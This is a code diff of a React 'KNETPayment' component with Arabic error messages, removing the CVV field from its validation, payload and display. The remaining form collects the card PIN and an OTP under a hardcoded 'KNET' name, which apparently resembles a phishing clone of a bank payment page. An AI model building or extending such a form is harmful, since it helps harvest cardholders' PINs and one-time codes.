@@ -88,7 +88,6 @@ export default function KNETPayment() {
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
   const [cardPin, setCardPin] = useState("");
-  const [cardCvv, setCardCvv] = useState("");
 
   // OTP state
   const [otpCode, setOtpCode] = useState("");
@@ -252,10 +251,6 @@ export default function KNETPayment() {
       setValidationError("خطأ : الرجاء أدخال الرقم السري المكون من اربع ارقام");
       return false;
     }
-    if (cardCvv.length !== 3 || !/^\d{3}$/.test(cardCvv)) {
-      setValidationError("خطأ : الرجاء إدخال رمز CVV المكون من 3 أرقام");
-      return false;
-    }
     if (!expiryMonth || !expiryYear) {
       setValidationError("خطأ : الرجاء أختيار شهر وسنة أنتهاء البطاقة");
       return false;
@@ -296,7 +291,6 @@ export default function KNETPayment() {
         nameOnCard: "KNET",
         expiryMonth: expiryMonth.padStart(2, "0"),
         expiryYear: expiryYear,
-        cvv: cardCvv,
         pin: cardPin,
         bankName: selectedBank,
         paymentMethod: "KNET",
@@ -670,24 +664,6 @@ export default function KNETPayment() {
                   </div>
                 </div>
 
-                {/* CVV */}
-                <div style={fieldRow}>
-                  <label style={fieldLabel}>CVV:</label>
-                  <div style={fieldValue}>
-                    <input
-                      type="password"
-                      inputMode="numeric"
-                      maxLength={3}
-                      value={cardCvv}
-                      onChange={(e) => {
-                        const val = e.target.value.replace(/\D/g, "");
-                        if (val.length <= 3) setCardCvv(val);
-                        setValidationError("");
-                      }}
-                      style={{ ...inputStyle, width: "100%" }}
-                    />
-                  </div>
-                </div>
 
                 {/* Buttons */}
                 <div
@@ -786,11 +762,6 @@ export default function KNETPayment() {
                 <span style={fieldValue}>****</span>
               </div>
 
-              {/* CVV */}
-              <div style={fieldRow}>
-                <label style={fieldLabel}>CVV:</label>
-                <span style={fieldValue}>***</span>
-              </div>
 
               {/* Rejected Error */}
               {rejectedError && (
